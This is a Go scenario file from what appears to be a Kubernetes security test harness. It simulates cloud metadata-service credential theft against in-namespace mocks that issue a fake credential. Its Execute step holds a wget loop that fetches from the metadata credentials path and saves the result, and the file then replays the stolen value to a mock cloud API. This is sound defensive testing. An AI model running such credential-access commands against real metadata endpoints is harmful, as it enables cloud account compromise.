package scenarios

import (
	"context"
	"encoding/json"
	"fmt"
	"k8s.io/apimachinery/pkg/types"
	"strings"
	"time"

	"github.com/r6security/phoenix-test-harness/internal/core"
	"github.com/r6security/phoenix-test-harness/internal/mocks"
)

func init() { core.RegisterScenario(&c3IMDSTheft{}) }

// c3IMDSTheft: a MOCK 169.254.169.254 metadata endpoint (in-ns ClusterIP) issues
// a FAKE cloud credential; the compromised pod retrieves it AND presents it
// against the mock cloud API. ORACLE: the already-captured fake value is
// presented and the fixed mock responder returns an authorized body. The
// responder does not validate its Authorization header. R6 CANNOT respond: IMDS theft is
// invisible to Phoenix; a stolen cloud cred stays valid after the pod rotates.
//
// CONTAINMENT: the harness points the attacker at the IN-NAMESPACE mock IMDS, not
// the real link-local address, and the credential is FAKE.
type c3IMDSTheft struct {
	app          string
	targetUID    types.UID
	capturedCred string
	imds         *mocks.MockIMDS
	cloud        *mocks.MockCloudAPI
}

func (s *c3IMDSTheft) Metadata() core.ScenarioMeta {
	return core.ScenarioMeta{
		Name:               "c3-imds-theft",
		Category:           core.CategoryModernUnsupported,
		Source:             "Cat3 c3-imds-theft; ADA II model/cloud cred; Phoenix-AI Model Theft",
		R6ResponseTag:      core.R6CannotRespond,
		AttackTechniqueIDs: []string{"T1552.005", "T1528", "T1552.007", "T1078.004"},
		R6Justification:    "IMDS credential theft hits the cloud metadata endpoint, invisible to Phoenix (no emitter, no network actuator); a stolen cloud credential remains valid after the pod rotates (cloud-side, not a pod identity Phoenix revokes). Cannot respond. Strong differentiator.",
	}
}

func (s *c3IMDSTheft) Setup(ctx context.Context, env *core.Env) error {
	s.app = "c3imds-target"
	imds, err := mocks.DeployIMDS(ctx, env)
	if err != nil {
		return err
	}
	s.imds = imds
	cloud, err := mocks.DeployMockCloudAPI(ctx, env)
	if err != nil {
		return err
	}
	s.cloud = cloud
	_, err = deployTarget(ctx, env, s.app, "", nil)
	return err
}

func (s *c3IMDSTheft) Execute(ctx context.Context, env *core.Env) (core.AttackResult, error) {
	pod, err := runningPodByApp(ctx, env, s.app)
	if err != nil {
		return core.AttackResult{}, err
	}
	s.targetUID = pod.UID
	stages := []string{
		"cred-access: hit mock IMDS (169.254.169.254 stand-in) for cloud creds (T1552.005)",
		"steal: retrieve the fake cloud credential (T1528)",
		"use: present the stolen cred to the mock cloud API (T1078.004)",
	}
	// Fetch the fake credential from the mock IMDS, then store it for the oracle.
	// Retry until the fetched body is non-empty: the mock readiness gate already
	// confirmed the listener serves, but the Service endpoint can lag the pod by a
	// beat; retrying removes the residual "len=0" race so the steal is reliable.
	fetchCmd := fmt.Sprintf("for i in 1 2 3 4 5; do wget -T 3 -qO- http://%s:8081/latest/meta-data/iam/security-credentials/role 2>/dev/null > /tmp/.r6th_imds_cred; if [ -s /tmp/.r6th_imds_cred ]; then break; fi; sleep 1; done; cat /tmp/.r6th_imds_cred", s.imds.ClusterDNS)
	res := env.Exec(ctx, pod.Name, firstContainer(pod), []string{"sh", "-c", fetchCmd})
	if err := stimulusExec(ctx, res); err != nil {
		return core.AttackResult{}, err
	}
	env.Log.Logf("c3-imds-theft: fetched cred body len=%d", len(res.Stdout))
	gotCred := json.Valid([]byte(strings.TrimSpace(res.Stdout))) && strings.Contains(res.Stdout, mocks.FakeIMDSCredential)
	if !gotCred {
		return core.AttackResult{}, fmt.Errorf("mock credential fetch missing or malformed")
	}
	s.capturedCred = strings.TrimSpace(res.Stdout)
	return core.AttackResult{
		Stages:   stages,
		Commands: []string{"wget mock-imds .../security-credentials/role  # FAKE cred", "present stolen cred to mock cloud API"},
		Notes:    map[string]string{"credFetched": fmt.Sprintf("%v", gotCred)},
	}, nil
}

func (s *c3IMDSTheft) SuccessOracle(ctx context.Context, env *core.Env) (core.OracleResult, error) {
	observationPause(2 * time.Second)
	ev := map[string]string{}
	pod, err := observationTarget(ctx, env, s.app, s.targetUID)
	if err != nil {
		// Source Pod loss cannot establish fake-value revocation or denial.
		return core.OracleResult{}, fmt.Errorf("observation target unavailable: %w", err)
	}
	if s.capturedCred == "" {
		return core.OracleResult{}, fmt.Errorf("captured mock credential unavailable")
	}
	// One local mock-only exec reads the saved fake value once and uses that same
	// shell variable for both the request and its digest evidence.
	res := env.Exec(ctx, pod.Name, firstContainer(pod), mockReplayCommand("/tmp/.r6th_imds_cred", s.cloud.ClusterDNS))
	out, err := observationExec(ctx, res)
	if err != nil {
		return core.OracleResult{}, err
	}
	response, err := capturedMockReplay(out, s.capturedCred)
	if err != nil {
		return core.OracleResult{}, err
	}
	authorized, err := mockResponderAuthorization(response)
	if err != nil {
		return core.OracleResult{}, err
	}
	ev["credUsed"] = fmt.Sprintf("%v", authorized)
	ev["cloudResponse"] = strings.TrimSpace(response)
	ev["mockResponderChecksHeader"] = "false"
	ev["originalPodUID"] = string(s.targetUID)
	ev["observedPodUID"] = string(pod.UID)
	state := fmt.Sprintf("captured FAKE fixture presented to in-namespace mock; fixed responder reported authorized=%v (header not authenticated)", authorized)
	return core.OracleResult{Achieved: authorized, ObservedState: state, Evidence: ev}, nil
}

func (s *c3IMDSTheft) Teardown(ctx context.Context, env *core.Env) error {
	return teardownByApp(ctx, env, s.app, "mock-imds", "mock-cloud-api")
}
